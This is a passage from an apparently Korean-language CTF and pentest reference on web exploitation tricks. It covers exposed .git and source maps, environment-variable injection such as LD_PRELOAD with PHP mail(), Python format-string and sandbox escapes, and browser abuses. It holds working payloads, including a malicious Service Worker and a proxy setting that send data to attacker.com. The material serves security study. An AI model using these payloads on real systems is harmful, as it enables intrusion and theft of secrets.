> 웹 서버의 잘못된 배포/설정으로 인해 소스 코드, 설정 파일, 버전 관리 데이터가 노출되는 패턴. CTF에서 정보 수집 단계의 핵심이며 실제 버그바운티에서도 높은 빈도.

### 9.1 `.git/` Directory Exposure

**Mechanism**: `.git/` 디렉토리가 웹 루트에 포함되어 서빙되면, 전체 소스 코드 및 커밋 히스토리 복원 가능.

```bash
# 탐지:
curl -s https://target.com/.git/HEAD
# → ref: refs/heads/main  (존재 확인)

# 전체 복원 (디렉토리 리스팅 비활성화 시에도 가능):
# .git/HEAD → refs/heads/main → .git/refs/heads/main → commit hash
# → .git/objects/[hash] → tree → blob → 소스 코드

# 자동화 도구:
git-dumper https://target.com/.git/ ./output
GitHacker --url https://target.com/.git/ --output-folder ./output
```

**추출 가능 데이터**: 소스 코드 전체, `.env` 파일 (커밋 히스토리에 포함된 경우), API 키, DB 비밀번호, 이전 버전의 취약한 코드.

### 9.2 Source Map File (`.js.map`) Exposure

```bash
# 탐지: JS 파일 끝에 sourceMappingURL 확인
curl -s https://target.com/assets/app.js | tail -1
# → //# sourceMappingURL=app.js.map

# 다운로드:
curl -s https://target.com/assets/app.js.map | jq '.sources'
# → 원본 소스 파일 목록 및 전체 내용
```

**Exploitation Context**: minified/bundled JavaScript의 원본 소스 코드 복원. API 엔드포인트, 비밀 로직, 하드코딩된 토큰 발견.

### 9.3 Backup & Metadata File Discovery

| File Pattern | Information |
|-------------|------------|
| `.env`, `.env.bak`, `.env.local` | DB 비밀번호, API 키, SECRET_KEY |
| `web.config`, `applicationHost.config` | IIS 설정, 연결 문자열 |
| `wp-config.php.bak`, `config.php~` | 데이터베이스 자격증명 |
| `.DS_Store` | macOS 디렉토리 구조 노출 |
| `.svn/entries`, `.svn/wc.db` | SVN 리포지토리 메타데이터 |
| `composer.json`, `package.json` | 의존성 및 버전 정보 |
| `.idea/`, `.vscode/` | IDE 설정, 디버그 구성, 데이터베이스 연결 |
| `*.swp`, `*.swo`, `*~` | vim/emacs 임시 파일 (원본 내용 포함) |
| `Dockerfile`, `docker-compose.yml` | 인프라 구성, 내부 서비스 정보 |
| `.htpasswd` | HTTP Basic Auth 해시 |

**`.DS_Store` 파싱**: macOS가 생성하는 이 파일은 디렉토리 내 파일/폴더명을 포함. `ds_store` 파서로 숨겨진 파일/디렉토리 발견.

```bash
python3 ds_store_parser.py .DS_Store
# → admin_backup/, secret_config.php, test_credentials.txt
```

---

## 10. Environment Variable Injection

> 환경 변수를 통해 런타임 동작을 변경하여 코드 실행, 라이브러리 하이재킹, 프록시 설정 변조를 달성하는 기법. Prototype pollution → env injection → RCE 체인이 최근 CTF에서 인기.

### 10.1 `LD_PRELOAD` Injection

**Mechanism**: Linux 동적 링커가 프로그램 실행 시 `LD_PRELOAD`에 지정된 공유 라이브러리를 먼저 로드.

```c
// evil.c — 공유 라이브러리 생성:
#include <stdlib.h>
__attribute__((constructor)) void init() {
    system("id > /tmp/pwned");
}
```

```bash
gcc -shared -fPIC -o evil.so evil.c
LD_PRELOAD=/path/to/evil.so /usr/bin/target
```

**Web Context**: PHP의 `mail()` 함수는 내부적으로 `sendmail`을 실행. `putenv("LD_PRELOAD=/tmp/evil.so")` + `mail()` 호출로 RCE.

```php
// PHP disable_functions 우회:
putenv("LD_PRELOAD=/tmp/evil.so");
mail("a@b.c", "", "", "");  // sendmail 실행 → evil.so 로드 → RCE
```

### 10.2 `NODE_OPTIONS` Injection

```bash
NODE_OPTIONS="--require /tmp/evil.js" node app.js
# → evil.js가 앱 시작 전에 실행됨

NODE_OPTIONS="--experimental-loader /tmp/evil.mjs" node app.js
# → ESM 로더로 모든 모듈 import를 가로채기
```

**Exploitation Context**: Prototype pollution으로 `process.env.NODE_OPTIONS`를 설정한 후 child process spawn 시 RCE.

### 10.3 `PYTHONPATH` / `PYTHONSTARTUP` Injection

```bash
PYTHONPATH="/tmp/evil" python3 target.py
# → /tmp/evil/ 디렉토리의 모듈이 표준 라이브러리보다 우선 로드

PYTHONSTARTUP="/tmp/evil.py" python3
# → 인터랙티브 세션 시작 시 evil.py 자동 실행
```

**Web Context**: 파일 업로드로 `/tmp/os.py`를 생성하고 `PYTHONPATH=/tmp` 설정 → `import os` 시 악성 모듈 로드.

### 10.4 `HTTP_PROXY` / `HTTPS_PROXY` Injection

**Mechanism**: 많은 HTTP 라이브러리가 `HTTP_PROXY` 환경변수를 자동 참조하여 프록시 설정.

```bash
HTTP_PROXY=http://attacker.com:8080
# → 서버의 outbound HTTP 요청이 공격자 프록시를 경유
# → API 키, 인증 토큰, 내부 데이터 인터셉트
```

**httpoxy (CVE-2016-5385)**: CGI 환경에서 `Proxy:` HTTP 헤더가 `HTTP_PROXY` 환경변수로 매핑되어, 외부 요청 경로를 변조할 수 있었음.

### 10.5 `GIT_SSH_COMMAND` / `GIT_CONFIG` Injection

```bash
GIT_SSH_COMMAND="id > /tmp/pwned" git clone ssh://...
GIT_DIR=/tmp/evil_repo git log  # 다른 리포지토리의 데이터 접근
```

---

## 11. Python-Specific Exploitation Primitives

> Python 웹 애플리케이션(Flask, Django, FastAPI 등)에서 발생하는 Python 언어 고유의 공격 벡터.

### 11.1 Format String Exploitation

**Mechanism**: Python의 `str.format()` 또는 f-string에 사용자 입력이 들어가면 객체 속성 접근 가능.

```python
# 취약한 코드:
user_input = request.args.get('name')
greeting = f"Hello, {user_input}!"  # 안전 (리터럴이 아님)

# 실제 취약 패턴:
template = "Hello, {name}! Your role is {role}."
result = template.format(name=user_input, role="user")  # 안전

# 위험한 패턴:
result = user_input.format(config=app.config)  # 취약!
# user_input = "{config[SECRET_KEY]}" → SECRET_KEY 유출
```

**Attribute Traversal**:
```python
# 더 깊은 속성 접근:
"{user.__class__.__init__.__globals__[SECRET]}"
"{user.__class__.__mro__[1].__subclasses__()}"
```

**Exploitation Context**: Flask/Django 템플릿에서 사용자 입력이 format string으로 처리될 때 설정 값, 비밀 키, 데이터베이스 자격증명 유출.

### 11.2 Python AST Injection

**Mechanism**: `ast.literal_eval()`은 안전하다고 알려져 있지만, 특정 버전/조건에서 우회 가능.

```python
# ast.literal_eval은 리터럴만 허용:
ast.literal_eval("[1, 2, 3]")  # OK
ast.literal_eval("__import__('os').system('id')")  # ValueError

# 그러나 compile() + exec() 조합:
code = compile("__import__('os').system('id')", "<string>", "exec")
exec(code)  # RCE
```

**`eval()` 제한 환경에서의 우회**:
```python
# eval이 있지만 builtins가 제한된 경우:
eval("().__class__.__bases__[0].__subclasses__()")
# → 모든 로드된 클래스 접근 → os.system 등 호출
```

### 11.3 Dunder Method Abuse for Data Access

```python
# 객체에서 비밀 데이터 접근:
obj.__class__.__init__.__globals__    # 모듈 전역 변수
obj.__class__.__mro__                 # Method Resolution Order
obj.__reduce__()                      # pickle 직렬화 메서드 호출
obj.__getattr__                       # 동적 속성 접근

# Flask 앱에서:
request.__class__.__mro__[3].__subclasses__()
# → Flask/Werkzeug 내부 클래스 접근
```

### 11.4 `input()` in Python 2

```python
# Python 2의 input()은 eval()과 동일:
password = input("Enter password: ")
# 입력: __import__('os').system('id')
# → 명령 실행!
```

**Note**: Python 2는 EOL이지만 레거시 시스템에 잔존.

---

## 12. Browser Mechanism Abuse

> 브라우저의 캐싱, 네비게이션, 워커, 메시지 전달 등 내장 메커니즘을 악용하는 고급 클라이언트 측 기법. Google CTF, HITCON CTF 등 최상위 대회에서 빈번 출현.

### 12.1 bfcache (Back-Forward Cache) Exploitation

**Mechanism**: 브라우저가 뒤로가기/앞으로가기 시 페이지를 완전히 메모리에서 복원(재요청 없이). 이때 이전의 JavaScript 상태, DOM, 네트워크 응답이 그대로 복원됨.

```javascript
// 공격 시나리오:
// 1. 피해자가 민감한 페이지 A를 방문 (CSRF 토큰, 개인 정보 포함)
// 2. 공격자 페이지로 리다이렉트
// 3. history.back()으로 페이지 A 복원
// 4. bfcache에서 복원된 DOM에서 데이터 추출

window.addEventListener('pageshow', (event) => {
    if (event.persisted) {
        // bfcache에서 복원됨 → 이전 상태 접근 가능
    }
});
```

**Exploitation Context**: 보안 헤더로 응답이 캐시되지 않도록 해도, bfcache는 별도 메커니즘이므로 `Cache-Control: no-store`만으로는 부족. `unload` 이벤트 핸들러 등록이 필요.

**CTF Appearances**: HITCON CTF 2024 (Private Browsing+), SECCON CTF 2022 (spanote).

### 12.2 Service Worker Abuse

**Mechanism**: Service Worker는 HTTPS 페이지에서 등록되면 해당 scope의 모든 네트워크 요청을 가로채고 수정 가능.

```javascript
// 악성 Service Worker 등록:
navigator.serviceWorker.register('/sw.js', { scope: '/' });

// sw.js 내용:
self.addEventListener('fetch', (event) => {
    if (event.request.url.includes('/api/secret')) {
        // 요청을 가로채서 공격자에게 전달
        fetch('https://attacker.com/log?' + event.request.url);
    }
    event.respondWith(fetch(event.request));
});
```

**Exploitation Chain**: XSS → Service Worker 등록 → 영구적 요청 감청 (XSS가 수정되어도 SW는 남아있음).

**`Service-Worker-Allowed` Header**: 서버가 이 헤더를 설정하면 scope 제한을 확장 가능.

### 12.3 `postMessage` Exploitation

**Mechanism**: `window.postMessage()`는 cross-origin 통신을 허용하지만, origin 검증이 없거나 불충분하면 악용 가능.

```javascript
// 취약한 수신 코드:
window.addEventListener('message', (event) => {
    // origin 검증 없음!
    eval(event.data.code);  // 또는 innerHTML, document.write 등
});

// 불충분한 검증:
window.addEventListener('message', (event) => {
    if (event.origin.indexOf('trusted.com') !== -1) {
        // trusted.com.evil.com 도 통과!
        // 올바른 검증: event.origin === 'https://trusted.com'
    }
});
```

**`e.source` Null Trick**:
```javascript
// postMessage 직후 윈도우를 닫으면 e.source가 null이 됨:
const w = window.open('target');
w.postMessage('data', '*');
w.close();
// → target의 message handler에서 e.source === null
// → origin 검증이 e.source 기반이면 우회
```

**CTF Appearances**: Google CTF 2024 (Sappy — postMessage + data: scheme), SekaiCTF 2024, DiceCTF 2024.

### 12.4 Connection Pool / Socket Exhaustion Timing

**Mechanism**: 브라우저의 동시 연결 수 제한(일반적으로 호스트당 6개)을 이용한 타이밍 사이드 채널.

```javascript
// 타겟 서버의 소켓을 모두 점유:
for (let i = 0; i < 5; i++) {
    fetch('https://target.com/slow-endpoint', { mode: 'no-cors' });
}

// 6번째 요청의 타이밍으로 이전 요청의 완료 시점 추론:
const start = performance.now();
fetch('https://target.com/api/check?id=1', { mode: 'no-cors' });
// → 이전 요청이 끝나야 이 요청이 시작됨
// → 응답 시간의 차이로 내부 상태 추론
```

**Exploitation Context**: XS-Leaks의 일종. 브라우저에서 cross-origin 리소스의 응답 크기나 처리 시간을 추론.

### 12.5 Scroll-to-Text Fragment Oracle

**Mechanism**: Chrome의 `#:~:text=` 프래그먼트가 매칭에 성공하면 스크롤이 발생하고, 이를 감지할 수 있는 사이드 채널이 존재.

```
https://target.com/page#:~:text=SECRET
→ 페이지에 "SECRET"이 존재하면 스크롤 발생
→ IntersectionObserver나 scroll 이벤트(일부 조건)로 감지
→ 한 글자씩 추론: #:~:text=a, #:~:text=b, ...
```

**Limitation**: same-origin에서만 스크롤 감지 가능하므로, iframe을 사용한 cross-origin 공격은 제한적.

---

## Cross-Reference: CTF Competition → Technique Mapping

| Competition | Year | Notable Tricks Used |
|------------|------|-------------------|
| **Google CTF** | 2024 | postMessage + data: scheme (Sappy), Shadow DOM `:host-context` CSS exfil (In the Shadows), regex A-z range bypass (Grand Prix Heaven) |
| **Google CTF** | 2025 | PRNG crack via base36 recovery (Postviewer v5), anti-debug unicode chars (JS Safe) |
| **HITCON CTF** | 2024 | bfcache exploitation (Private Browsing+), encoding chunk-by-chunk differential, SCRIPT_NAME header manipulation |
| **DiceCTF** | 2024 | DOM clobbering of `defaultView` (React Router), SQL injection with incremental ID (funnylogin) |
| **PlaidCTF** | 2025 | TLS private key recovery from corrupted RSA, pcap decryption (Tales from the Crypt) |
| **corCTF** | 2024 | CSS injection, iframe attribute exfiltration |
| **SekaiCTF** | 2024 | Character encoding escape sequences, CSP bypass via data URI, localStorage exfiltration |
| **SECCON CTF** | 2024 | Pyjail escape via `help()` function for import |
| **Intigriti** | 2024 | DOM clobbering + base tag injection + CSP bypass (July 2024), jQuery selector clobbering (January 2024) |
| **KalmarCTF** | 2025 | numpy `genfromtxt` abuse for pyjail escape |
| **jailCTF** | 2025 | Advanced pyjail: gc module, function default dict, bytecode manipulation |

---

## Practical Applicability Matrix

| Trick Category | CTF Frequency | Bug Bounty Impact | Pentest Value |
|---------------|---------------|-------------------|---------------|
| PHP Type Juggling | Very High (PHP < 8) | Medium (legacy apps) | High |
| PHP Filter Chain | Very High | High (WordPress, Laravel) | High |
| Pyjail Escape | Very High | Low (rare in prod) | Medium |
| JS VM Escape | High | High (SaaS, serverless) | High |
| Hash Length Extension | Medium | Medium (custom APIs) | High |
| ECB/CBC Crypto Abuse | Medium | Medium (legacy crypto) | High |
| Padding Oracle | Medium | High (CVE history) | Very High |
| PRNG Prediction | Medium | High (token generation) | Very High |
| DOM Clobbering | High | Medium (CSP environments) | Medium |
| CSS Injection Exfil | High | Medium (strict CSP) | Medium |
| Dangling Markup | Medium | Medium | Medium |
| SSI Injection | Low | Low (legacy servers) | Medium |
| ESI Injection | Medium | High (CDN environments) | High |
| LaTeX Injection | Medium | Medium (doc generation) | Medium |
| XSLT Injection | Low | Medium (XML pipelines) | Medium |
| PDF Generation SSRF | High | Very High (common in SaaS) | Very High |
| Argument Injection | High | High (any CLI integration) | Very High |
| Wildcard Injection | Medium | Medium (cron/scripts) | High |
| Regex Bypass | Very High | High (input validation) | Very High |
| Blind Regex Exfil | Low | Medium (search features) | Medium |
| .git Exposure | Very High | Very High (info disclosure) | Very High |
| Source Map Exposure | High | High (frontend apps) | High |
| Env Variable Injection | Medium | High (PP→RCE chain) | High |
| Python Format String | High | Medium (Flask/Django) | High |
| bfcache Exploitation | Low | Low (advanced) | Low |
| Service Worker Abuse | Medium | Medium (persistence) | Medium |
| postMessage Exploitation | High | High (SPA applications) | High |

---

## References & Resources

### Tools
| Tool | Purpose |
|------|---------|
| `php_filter_chain_generator` (Synacktiv) | PHP filter chain RCE payload 생성 |
| `php_filter_chains_oracle_exploit` (Synacktiv) | Blind LFI → file read via error oracle |
| `php_mt_seed` | PHP mt_rand() 시드 크래킹 |
| `mersenne-twister-predictor` | Python random 모듈 PRNG 예측 |
| `HashPump` / `hash_extender` | Hash length extension attack |
| `PadBuster` | Padding oracle 자동화 |
| `git-dumper` / `GitHacker` / `GitTools` | .git 디렉토리 복원 |
| `ds_store_parser` | .DS_Store 파일 파싱 |
| `wildpwn` | Wildcard injection 자동화 |
| `Z3 SMT Solver` | Partial PRNG output에서 상태 복원 |
| `pyjailbreaker` | Pyjail escape payload 생성 |

### Key Research & Writeups
- Synacktiv — [PHP Filters Chain: What is it and how to use it](https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it) (2022)
- Synacktiv — [PHP Filter Chains: File Read from Error-Based Oracle](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle) (2023)
- Bishop Fox — [Untwisting the Mersenne Twister](https://bishopfox.com/blog/untwisting-mersenne-twister-killed-prng)
- PortSwigger — [Evading CSP with DOM-based Dangling Markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)
- Huli — [Beyond XSS: DOM Clobbering](https://aszx87410.github.io/beyond-xss/en/ch3/dom-clobbering/)
- Huli — [CSS Injection: Attacking with Just CSS](https://aszx87410.github.io/beyond-xss/en/ch3/css-injection/)
- Huli — [GoogleCTF 2024 Writeups](https://blog.huli.tw/2024/06/28/en/google-ctf-2024-writeup/)
- Huli — [HITCON CTF & corCTF & SekaiCTF 2024 Writeup](https://blog.huli.tw/2024/09/23/en/hitconctf-corctf-sekaictf-2024-writeup/)
- terjanq — [Postviewer v5 Writeup (Google CTF 2025)](https://gist.github.com/terjanq/e66c2843b5b73aa48405b72f4751d5f8)
- elttam — [Hacking with Environment Variables](https://www.elttam.com/blog/env/)
- jailCTF — [Pyjail Collection](https://github.com/jailctf/pyjail-collection)
- Chovid99 — [Google CTF 2025](https://chovid99.github.io/posts/google-ctf-2025/)
- jsur.in — [PlaidCTF 2025 Tales from the Crypt](https://jsur.in/posts/2025-04-07-plaid-ctf-2025-tales-from-the-crypt/)

---

*이 문서는 기존 the-map 프로젝트의 취약점 분류(SQL Injection, XSS, SSRF, Deserialization, HTTP Smuggling, Race Condition, IDOR, File Upload, JWT, OAuth, SAML, CSRF, CORS, Unicode, URL Confusion, ZIP, Prototype Pollution, Cache Poisoning, WAF Bypass, Command Injection, SSTI, XXE, Mass Assignment, Cookie, Open Redirect 등)와 중복되지 않는 CTF 특이 기법들만을 정리한 것이다. 각 기법은 CTF에서 반복 검증되었으며, 표시된 실용적 적용 가능성은 실제 버그바운티/침투테스트 경험에 기반한다.*
